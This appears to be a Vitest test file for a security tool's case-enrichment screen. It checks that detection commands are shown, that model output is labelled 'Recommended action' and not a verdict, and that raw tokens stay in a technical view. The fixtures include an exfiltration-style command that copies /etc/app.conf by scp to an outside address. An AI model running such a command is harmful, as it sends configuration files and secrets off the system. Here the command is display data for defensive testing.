import { renderToStaticMarkup } from "react-dom/server";
import { afterEach, describe, expect, it } from "vitest";

import { parseUnifiedCase } from "../api/cases";
import { CaseEnrichmentView, RECOMMENDED_ACTION } from "./CaseEnrichment";
import { setTechnicalDetail } from "./TechnicalDetail";
import heldBackCase from "../../tests/fixtures/enterprise/case-held-back-005.json";

/**
 * What a case says about itself, RENDERED from the payload a paid host sends
 * (a decoy session whose block was skipped, addresses changed to the
 * documentation range).
 */

afterEach(() => setTechnicalDetail(false));

const parsed = parseUnifiedCase(heldBackCase);

function withCommand(command: unknown) {
  return parseUnifiedCase({
    ...heldBackCase,
    enrichment: { ...heldBackCase.enrichment, detection: { ...heldBackCase.enrichment.detection, command } },
  });
}

describe("the parser keeps what the host says in plain words", () => {
  /**
   * THE DEFECT THIS PINS: the host sends the command a finding is about and
   * who recommended the action in plain words, and the parser dropped both,
   * so the screen showed neither and printed the provider's wire token.
   *
   * FAILS ON REVERT: drop either key from `parseEnrichment` and it is gone.
   */
  it("keeps detection.command and ai.decided_by", () => {
    expect(withCommand("scp /etc/app.conf user@203.0.113.5:/tmp/").enrichment?.detection?.command).toBe("scp /etc/app.conf user@203.0.113.5:/tmp/");
    expect(parsed.enrichment?.ai?.decided_by).toBe("On-device Warden model");
  });

  it("adds neither key when the host did not send it, so an older host parses as before", () => {
    expect(parsed.enrichment?.detection && "command" in parsed.enrichment.detection).toBe(false);
    for (const junk of ["", 7, null, ["a"]]) {
      expect(withCommand(junk).enrichment?.detection && "command" in (withCommand(junk).enrichment?.detection ?? {})).toBe(false);
    }
    const older = parseUnifiedCase({ ...heldBackCase, enrichment: { ...heldBackCase.enrichment, ai: { ...heldBackCase.enrichment.ai, decided_by: undefined } } });
    expect(older.enrichment?.ai && "decided_by" in older.enrichment.ai).toBe(false);
  });
});

describe("the case context, rendered", () => {
  it("shows the command a finding is about", () => {
    const html = renderToStaticMarkup(<CaseEnrichmentView enrichment={withCommand("scp /etc/app.conf user@203.0.113.5:/tmp/").enrichment} />);
    expect(html).toContain("The command");
    expect(html).toContain("scp /etc/app.conf user@203.0.113.5:/tmp/");
  });

  /**
   * "AI verdict / Verdict: Block IP / Provider: local_classifier" sat on a
   * case where nothing was blocked. The model recommends; the outcome panel
   * says what happened. Its token and its raw dump are for the technical view.
   *
   * FAILS ON REVERT: label the card "AI verdict" again, or print the
   * provider in the plain view, and this sees it.
   */
  it("calls the model's answer a recommended action, by whoever recommended it", () => {
    const html = renderToStaticMarkup(<CaseEnrichmentView enrichment={parsed.enrichment} />);
    expect(RECOMMENDED_ACTION).toBe("Recommended action");
    expect(html).toContain(">Recommended action<");
    expect(html).toContain('aria-label="Recommended action"');
    expect(html).not.toContain("AI verdict");
    expect(html).not.toContain(">Verdict<");
    expect(html).toContain("On-device Warden model");
    expect(html).toContain("Block IP");
    expect(html).not.toContain("local_classifier");
    expect(html).not.toContain("confidence 0.857");
  });

  it("keeps the provider and the model's own reasoning in the technical view", () => {
    setTechnicalDetail(true);
    const html = renderToStaticMarkup(<CaseEnrichmentView enrichment={parsed.enrichment} />);
    expect(html).toContain("local_classifier");
    expect(html).toContain("confidence 0.857");
  });

  it("calls a rule's proposal a recommended action too, never an outcome", () => {
    const rule = parseUnifiedCase({
      ...heldBackCase,
      enrichment: { ...heldBackCase.enrichment, ai: { provider: "repeat-offender", model_kind: "unknown", verdict: "Block IP", reason: "Repeat offender: blocked 3 times." } },
    });
    const html = renderToStaticMarkup(<CaseEnrichmentView enrichment={rule.enrichment} />);
    expect(html).toContain(">Recommended action<");
    expect(html).not.toContain(">Outcome<");
    expect(html).not.toContain("is below");
  });

  /**
   * THE DEFECT THIS PINS: when no model ran, the review's own reason was
   * printed in the plain view whatever it said, and on a live case it said
   * "Auto-blocked: ssh_bruteforce from 72.167.227.34 (rule-based, no AI
   * needed, block 24h)" and "threat_intel matched on the first sighting".
   * A reason built from tokens is kept for the technical view; one that
   * reads as words is still shown to everyone.
   *
   * FAILS ON REVERT: print the reason unguarded and the tokens are in the
   * plain view.
   */
  it("keeps a reason built from tokens for the technical view when no model ran", () => {
    const withReason = (reason: string) => parseUnifiedCase({
      ...heldBackCase,
      enrichment: { ...heldBackCase.enrichment, ai: { provider: "rule-engine", model_kind: "unknown", verdict: "block_ip", reason } },
    }).enrichment;
    for (const reason of [
      "Auto-blocked: ssh_bruteforce from 72.167.227.34 (rule-based, no AI needed, block 24h)",
      "Blocking 112.161.26.125. threat_intel matched on the first sighting.",
    ]) {
      const plain = renderToStaticMarkup(<CaseEnrichmentView enrichment={withReason(reason)} />);
      expect(plain, reason).not.toContain("_");
      expect(plain, reason).toContain("No model classified this one");
      setTechnicalDetail(true);
      expect(renderToStaticMarkup(<CaseEnrichmentView enrichment={withReason(reason)} />), reason).toContain(reason);
      setTechnicalDetail(false);
    }
    const words = "Repeat offender: blocked 3 times.";
    expect(renderToStaticMarkup(<CaseEnrichmentView enrichment={withReason(words)} />)).toContain(words);
  });

  /**
   * THE DEFECT THIS PINS: a map whose marker was the country's centroid,
   * with two decimals of false precision, a dashed "No geolocation" box
   * where there was none, and a footnote doubting everything above it and
   * pointing at a place on the page.
   *
   * FAILS ON REVERT: restore any of the three and it renders here.
   */
  it("draws no map, no missing-location box and no footnote", () => {
    const html = renderToStaticMarkup(<CaseEnrichmentView enrichment={parsed.enrichment} />);
    expect(html).toContain("Australia");
    expect(html).not.toContain("<svg");
    expect(html).not.toContain("Approximate location");
    expect(html).not.toContain("-25.30, 133.80");
    expect(html).not.toContain("independently verified");
    expect(html).not.toContain("is below");
    const noGeo = parseUnifiedCase({
      ...heldBackCase,
      enrichment: { ...heldBackCase.enrichment, threat_intel: { ip: "198.51.100.23", geo: null, campaign_ids: [] } },
    });
    expect(renderToStaticMarkup(<CaseEnrichmentView enrichment={noGeo.enrichment} />)).not.toContain("No geolocation");
  });
});
